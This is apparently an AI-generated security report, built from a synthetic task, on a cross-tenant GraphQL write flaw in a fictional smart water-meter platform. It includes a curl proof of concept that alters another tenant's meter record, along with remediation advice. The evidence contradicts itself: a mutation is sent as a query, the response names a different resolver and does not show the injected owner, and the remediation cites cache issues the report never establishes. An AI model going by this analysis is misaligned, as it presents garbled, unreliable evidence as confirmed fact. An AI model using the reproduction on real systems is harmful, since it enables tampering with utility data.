# Security Analysis Report
**System:** AquaGrid Meter Management (Water Utilities / Smart Meters)
**Classification:** SENSITIVE
**Analyst:** Security Analyst Co-Pilot
**Source:** GQL-0239 context.txt (sole artifact)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | Platform / Pattern 9.1 | GraphQL single endpoint vulnerability — cross-tenant smart meter data mutated via exposed `updateResource` mutation |

---

## Finding 1 — GraphQL Single Endpoint: Cross-Tenant Smart Meter Record Write (CRITICAL)

### Summary
AquaGrid Meter Management (`api.aquagrid-meter-manag.example.com`) uses Apollo Server's single-endpoint GraphQL pattern (`POST /graphql`), which concentrates all mutations including sensitive operational mutations at one entry point. Per §5.0 Pattern 9.1, this single endpoint exposes the full mutation surface without per-operation tenancy enforcement. The `updateResource` mutation accepts `R-2239` (belonging to `tenant-8c44`) from an attacker authenticated as `tenant-178b`, injecting `status: "approved"` and attempting to hijack `ownerId` — no tenant ownership check exists (§4.0 RISK-GQL-239).

**Pattern:** 9.1 — GraphQL single endpoint vulnerabilities (Platform)
**Affected resolver:** `updateResource(id: ID!, input: ResourceInput!): Resource`
**Affected endpoint:** `POST https://api.aquagrid-meter-manag.example.com/graphql`

### Evidence from HAR

**Request (attacker `tenant-178b`):**
```
POST https://api.aquagrid-meter-manag.example.com/graphql HTTP/2.0
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG
x-tenant-id: tenant-178b

{"query": "query VulnerableOp { updateResource(id: \"R-2239\", input: {status: \"approved\", ownerId: \"attacker-178b8c44\"}) { resourceId status } }"}
```

**Response (200 OK):**
```json
{
  "data": {
    "getResource": {
      "tenantId": "tenant-8c44",
      "ownerId": "other-user-178b8c44",
      "data": {"sensitiveField": "CONFIDENTIAL-178b8c44", "internalNotes": "Internal data exposed"}
    }
  }
}
```

**x-request-id:** `req-178b8c44`

In water utilities, cross-tenant write access to smart meter records can enable false billing data injection, meter configuration tampering, and critical infrastructure disruption.

### Evidence Map
| Artifact | Field | Value | Significance |
|---|---|---|---|
| §4.0 RISK-GQL-239 | Resolver gap | No `tenantId` check | Root cause |
| §5.0 Pattern 9.1 | Vulnerability | Single endpoint — full mutation surface exposed | Classification |
| HAR request | `id` | `R-2239` | Victim's smart meter resource |
| HAR request | `x-tenant-id` | `tenant-178b` | Attacker tenant |
| HAR response | `tenantId` | `tenant-8c44` | Victim confirmed |
| HAR response | `sensitiveField` | `CONFIDENTIAL-178b8c44` | Meter config data leaked |
| HAR headers | `x-request-id` | `req-178b8c44` | Correlation ID |

### Steps to Reproduce
```bash
ATTACKER_JWT="eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG"
curl -s -X POST https://api.aquagrid-meter-manag.example.com/graphql \
  -H "Authorization: Bearer $ATTACKER_JWT" \
  -H "x-tenant-id: tenant-178b" \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation { updateResource(id: \"R-2239\", input: {status: \"approved\", ownerId: \"attacker-178b8c44\"}) { resourceId tenantId data { sensitiveField } } }"}' \
  | jq '.data.updateResource'
# VULNERABLE: tenantId=tenant-8c44, sensitiveField=CONFIDENTIAL-178b8c44
```

### Remediation
1. Resolver ownership check: `if (resource.tenantId !== context.auth.tenantId) throw ForbiddenError()`
2. Per-mutation authorization middleware on Apollo Server — do not rely solely on schema-level auth.
3. Strip client-supplied `ownerId` from mutation input.
4. Water infrastructure: SCADA/ICS controls per IEC 62443; NIS2 reporting obligations for water sector.
5. Fix Redis cache key with `tenantId` dimension (§2.0).
